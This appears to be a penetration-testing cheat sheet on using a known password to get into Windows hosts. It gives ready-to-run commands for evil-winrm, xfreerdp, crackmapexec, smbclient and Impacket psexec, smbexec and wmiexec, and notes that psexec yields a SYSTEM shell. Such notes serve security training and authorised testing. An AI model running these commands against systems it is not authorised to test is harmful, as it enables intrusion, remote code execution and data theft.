### **WINRM**

WinRM is a management protocol used to remotely communicate with another system in the Windows realm. You can pass  
the password to this service to gain access if it’s enabled:  
`evil-winrm -i 'TARGET-IP' -u 'USERNAME' -p 'PASSWORD'`  
In this scenario we have a password which we passed to WinRM using the ‘evil-winrm’ tool.

### **RDP**

RDP is a protocol to remotely control desktop computers. Once again we can pass our password to this service if enabled, In this scenario we’ve used ‘xfreerdp’ to talk with the RDP protocol and gained access to the system through a graphical  
interface.  
`xfreerdp /v:TARGET-IP /u:USERNAME /p:'PASSWORD' /drive:linux,/home/kali/yo/SessionGopher`

### **MSSQL**

We can also pass the password to MSSQL service if enabled and authorized to exfiltrate sensitive information out of the  
network or to execute OS commands. To check if MSSQL is enabled on the target system:  
`crackmapexec mssql TARGET-IP -u 'USERNAME' -p 'PASSWORD'`

### **SMB**

SMB is a file sharing protocol widely used in the Windows realm. To check if authorized:  
`crackmapexec smb TARGER-IP -u 'USERNAME' -p 'PASSWORD'`

To list shared folders:  
`smbclient -U 'USERNAME' -L \\TARGET-IP`

And finally to connect to the target share which in our case is ‘Users’:  
`smbclient -U 'USERNAME' \\\\TARGET-IP\\SHARE`

### **INTERACTIVE-SHELL**


Several tools can provide an interactive shell by exploiting protocols like SMB. One commonly used tool is psexec from the Impacket toolkit:

`/usr/bin/impacket-psexec 'USERNAME:PASSWORD@TARGET-IP'`  
**WHAT IT DOES:** The tool locates a writable SMB share on the target, uploads a payload (typically a service binary), creates a new service to run it, and starts that service. This process gives us a shell with NT AUTHORITY\SYSTEM privileges.

There are also other tools that can do magic like that:  
`impacket-smbexec 'USERNAME:PASSWORD'@TARGET-IP`

And ‘wmiexec’:  
`impacket-wmiexec 'USERNAME:PASSWORD'@TARGET-IP`